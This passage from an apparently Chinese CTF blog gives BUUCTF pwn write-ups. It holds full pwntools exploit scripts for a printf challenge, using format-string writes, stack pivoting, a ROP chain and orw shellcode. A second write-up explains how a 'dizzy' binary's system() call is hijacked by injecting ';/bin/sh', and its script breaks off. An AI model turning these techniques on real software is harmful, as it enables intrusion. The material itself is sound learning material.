class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pop_rdx_addr = <span class="number">0x1b96</span> + libc_base</span><br><span class="line">    pop_rdi_addr = base_addr + <span class="number">0xbc3</span></span><br><span class="line">    pop_rsi_r15_addr = base_addr + <span class="number">0xbc1</span></span><br><span class="line">    read_addr = <span class="number">0x110070</span> + libc_base</span><br><span class="line">    write_addr = libc_base + <span class="number">0x110140</span></span><br><span class="line">    open_addr = libc_base + <span class="number">0x10fc40</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># open(flag_addr,0)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(base_addr + <span class="number">0x202068</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(1,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write(2,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(<span class="number">2</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(write_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28285</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220429211253788-2009575560.png" alt="image-20220429204629254"></p>
<h2 id="2、用shellcode执行orw"><a href="#2、用shellcode执行orw" class="headerlink" title="2、用shellcode执行orw"></a>2、用shellcode执行orw</h2><p>这个本地看到flag了，但是远程有问题，也在此记录一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from pwncli import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    io_stderr_addr = libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;io_stderr_addr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(io_stderr_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    print_ret_addr = leak_addr - <span class="number">0x20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;print_ret_addr--------&gt;&#x27;</span>, <span class="built_in">hex</span>(print_ret_addr))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;构造栈链，第一次构造一个指向buf的栈地址&#x27;&#x27;&#x27;</span></span><br><span class="line">    leak = (leak_addr) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    rsp_addr = <span class="number">0xbbd</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第二次通过指向buf的栈地址，将buf修改为stdout&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第三次通过stdout将_IO_2_1_stdout_改成_IO_2_1_stderr_值，此时需要爆破倒数第二字节的前半字节，猜测为0，概率1/16&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    stderr = io_stderr_addr &amp; <span class="number">0xfff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;stderr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(stderr))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;下面来判断是否将stdout指向的值改写成stderr指向的值&#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;XXXXXX&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    main_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># main_addr=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line">    base_addr = main_addr - <span class="number">0xb24</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(base_addr))</span><br><span class="line">    pause()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_libc=<span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_libc-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line">    libc_base = leak_libc- <span class="number">0x21b97</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    rsp_hook = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_hook----------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x10a2fc</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;one_gadget--------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">    high_addr = (one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;high_addr---------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(high_addr))</span><br><span class="line">    medium_addr = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;medium_addr-------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(medium_addr))</span><br><span class="line">    low_addr = (one_gadget) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;low_addr----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(low_addr))</span><br><span class="line"></span><br><span class="line">    rsp_addr = rsp_addr + base_addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    rsp_addr = rsp_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    hook1 = (rsp_hook + <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hook1-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(hook1))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将menu函数的返回地址修改成pop rsp</span></span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入bss段指针</span></span><br><span class="line">    bss_hook = rsp_hook + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload=&#x27;%&#x27;+str(low_addr)+&#x27;c%10$hn&#x27;</span></span><br><span class="line">    <span class="comment"># p.sendline(payload.ljust(0x12c-1,&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#布置迁移地址bss_addr+8  因为bss要存放d^3CTF</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr+<span class="number">8</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># lb = LibcBox()</span></span><br><span class="line">    <span class="comment"># lb.add_symbol(&#x27;__libc_start_main&#x27;, leak_libc)  # 这个地方跟libcsearcher用法基本一样，下面也是去dump出来</span></span><br><span class="line">    <span class="comment"># lb.search(download_so=1)</span></span><br><span class="line">    <span class="comment"># libc_base = puts_addr - lb.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line"></span><br><span class="line">    mprotect_addr=libc_base+<span class="number">0x11bae0</span></span><br><span class="line">    read_addr=<span class="number">0x116600</span>+libc_base</span><br><span class="line">    write_addr=libc_base+<span class="number">0x1166a0</span></span><br><span class="line">    open_addr=libc_base+<span class="number">0x10fc40</span></span><br><span class="line">    <span class="comment">#mprotect(bss_addr,0x100000,7)</span></span><br><span class="line">    csu1_gadget=base_addr+<span class="number">0xbba</span></span><br><span class="line">    pop_rdx_addr=<span class="number">0x1b96</span>+libc_base</span><br><span class="line">    term_proc=base_addr+<span class="number">0x201DB8</span></span><br><span class="line">    magic_gadget=base_addr+<span class="number">0x8de</span></span><br><span class="line">    pop_rdi_addr=base_addr+<span class="number">0xbc3</span></span><br><span class="line">    pop_rsi_r15_addr=base_addr+<span class="number">0xbc1</span></span><br><span class="line">    </span><br><span class="line">    exit_addr=<span class="number">0x43120</span>+libc_base</span><br><span class="line">    alarm_offset=<span class="number">0xe44f0</span></span><br><span class="line">    alarm_got_addr=<span class="number">0x201FB0</span>+base_addr</span><br><span class="line">    orw_shellcode=<span class="string">&#x27;\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x02\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&#x27;</span></span><br><span class="line">    payload=<span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(pop_rdi_addr)+p64(base_addr+<span class="number">0x202000</span>)</span><br><span class="line">    payload+=p64(pop_rsi_r15_addr)+p64(<span class="number">0x100000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(pop_rdx_addr)+p64(<span class="number">7</span>)</span><br><span class="line">    payload+=p64(mprotect_addr)</span><br><span class="line">    payload+=p64(base_addr+<span class="number">0x60</span>+<span class="number">0x202060</span>+<span class="number">0x8</span>)</span><br><span class="line">    payload+=orw_shellcode</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25582</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    <span class="keyword">if</span> leak_addr &amp; <span class="number">0xffff</span> &gt; <span class="number">0x2000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;---------i------------&#x27;</span>, i)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;may you enjoy my printf test!\n&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个是本地出的flag</p>
<p><img src="/../img/2706180-20220429211252638-1134810034.png" alt="image-20220429204916689"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>爆破</tag>
        <tag>orw</tag>
        <tag>格式化字符串漏洞</tag>
        <tag>magic_gadget</tag>
        <tag>沙箱</tag>
        <tag>栈迁移，close关闭文件描述符</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF_bjdctf_2020_dizzy</title>
    <url>/posts/160e7f7d.html</url>
    <content><![CDATA[<p>通过这道题的学习与收获有：</p>
<p>1、分析这种漏洞比较明显的题目，应该倒推程序逻辑，而且程序最后给出了system(command)，而command又是个地址（指向我们所输入的内容），此时应该很容易想到，我们输入&#x2F;bin&#x2F;sh就可以执行。但是我开始没有想到这一点… 还是做的少。</p>
<p>2、考察了linux下命令行多命令执行的特定。如果命令被;分开，即使前面的命令执行错误也依旧会执行后面的命令。</p>
<p>3、u32可以一次转四个字符为对应ASCII码，返回值为int类型。</p>
<p>4、当格式化字符为%d时，我们想存入字符串，应该输入对应其ASCII。</p>
<p>5、这道题又是地址又是*地址的，开始容易搞迷糊，应该仔细捋一下。</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012027700.png"></p>
<h2 id="程序分析-amp-amp-大致思路："><a href="#程序分析-amp-amp-大致思路：" class="headerlink" title="程序分析&amp;&amp;大致思路："></a>程序分析&amp;&amp;大致思路：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012027702.png"></p>
<p>倒着分析一下，如果程序要执行system(command)就不能进入最后的一个if。也就是说最后的*v8要为0。并且command还要为&#x2F;bin&#x2F;sh参数或者sh参数。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012027703.png"></p>
<p>这道题搜到了sh，然后思路就彻底跑偏了。因为我一直在考虑怎么对抗PIE保护（因为开了PIE之后，这个sh地址是没法直接用的），想对抗PIE的话，首先想到的就是泄露程序泄露基地址，不过这道题打印函数是不可能去泄露的，同时我们也没法溢出，不可能控制返回地址，因此泄露基地址这个方向绝对行不通。</p>
<p><em><strong>（这里当时想的就不对，command本身就是个地址，而我们输入的内容是存放到了command指向的位置，因此给system的command本身就是个指针了，所以就不可能再写sh的地址了）</strong></em></p>
<p>这道题依然需要倒着分析，先看这一部分。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012027704.png"></p>
<p>因为*v8最后肯定是要为0的，这个定死了。可是我们是控制不了*v8的值，不过这里分析一下这个循环。什么时候*v8可以为0？我们发现每次循环v8都会++，因此只有当*v8指向字符串末尾的时候，它的值才为0。因此我们肯定是要让这个for执行完毕。</p>
<p>再观察一下这个for循环整体，i和v7拿到的都是command（输入内容最开始的地址），每次循环先判断*v8是否为0（如果为0的话就会触发break结束掉循环（不过我们分析过了，只有在*v8到达字符串末尾的时候才会为0,因此这里不用考虑这个break））</p>
<p>第二个if，每次的v7都不能和*v8的值相同（如果相同，就会提前break掉导致*v8不为0)，而v7将循环遍历command[0]开始的每一个内存单元，而我们是可以控制每个内存单元的值的，接下来分析另一个部分。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012027705.png"></p>
<p>v4和v3还有v6都是command。然后输入的内容（必须是int型，如果是char类型程序将直接结束）将存放到command中，只要v4不是command+80就继续进行循环，也就是进行20次循环。由于每次v4+4并且又赋给v6，因此v6也在移动，也就是说我们输入的内容会依次存到command~command+80的位置。</p>
<p>然后进入第二个循环，这个循环很简单，就是v3去从command开始遍历，将每个内存单元的值都加上114514，等到v3为4100的时候，就可以出来这个循环了（v3将最后超过了我们可控制的command+80,不过仔细想一下，这并不影响，对么？</p>
<h2 id="执行system时的小坑"><a href="#执行system时的小坑" class="headerlink" title="执行system时的小坑"></a>执行system时的小坑</h2><p>至此通过了所有的检查，可以执行system(command)，command前面是需要输入PvvN| 1S S0 GREAT!</p>
<p>这里有个坑<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012027706.png"><br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012027707.png"></p>
<p>内容在这里。</p>
<p>然后PvvN| 1S S0 GREAT!的后面是我们要输入的命令，这里考察了linux系统命令行多命令执行的特点。</p>
<blockquote>
<p> Linux 系统可以在一个命令行上执行多个命令:<br>     ; –如果命令被分号(;)所分隔，那么命令会连续的执行下去，就算是错误的命令也会继续执行后面的命令<br>     &amp;&amp; –如果命令被 &amp;&amp; 所分隔，那么命令也会一直执行下去，但是中间有错误的命令就不会执行后面的命令，没错就继续执行直至命令执行完为止<br>     || –如果命令被双竖线 || 所分隔，那么一遇到可以执行成功的命令就会停止执行后面的命令，而不管后面的命令是否正确。如果执行到错误的命令就是继续执行后一个命令，直到遇到执行到正确的命令或命令执行完为止</p>
</blockquote>
<p>此处转自<a href="https://blog.csdn.net/weixin_45582916/article/details/122519353">(27条消息) PWN-PRACTICE-CTFSHOW-4_P1umH0的博客-CSDN博客</a></p>
<p>因为我们前面输入的内容会被当做命令执行，它肯定是错误的，因此我们紧接着需要用;来连接后面的参数&#x2F;bin&#x2F;sh（sh也是可以的）</p>
<p><strong>因为我们只能输入整数，因此我们输入是以ASCII码的形式将字符输入进去的。</strong></p>
<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27224</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">flag=<span class="string">&quot;PvvN| 1S S0 GREAT!;/bin/sh\x00\x00&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    a=i*<span class="number">4</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(u32(flag[a:a+<span class="number">4</span>])-<span class="number">114514</span>))<span class="comment">#因为当时*v3加了114514,因此这里要减去，才能存入我们想要的值</span></span><br><span class="line">    <span class="comment">#因为一个内存单元只能存四个字节，因此一次发送四个字节过去，用u32将字符转换成对应的ASCII码（u32返回值为int类型，同时u32正好需要四个参数）</span></span><br><span class="line">    <span class="comment">#这道题也可以用chr来转换，不过就是比较麻烦，也算知道了u32的新用法</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    p.sendline(<span 